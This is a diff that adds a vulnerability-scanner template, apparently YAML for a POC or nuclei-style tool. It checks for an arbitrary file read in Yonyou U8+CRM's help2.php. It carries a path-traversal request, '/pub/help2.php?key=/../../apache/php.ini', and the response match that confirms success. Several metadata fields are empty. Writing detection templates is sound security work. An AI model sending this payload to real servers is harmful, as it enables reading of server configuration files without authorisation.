@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 用友U8+CRM help2 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /pub/help2.php?key=/../../apache/php.ini
+  headers:
+response1:
+  headers:
+  body: php
+  code: 200
+requests2:
+response2:
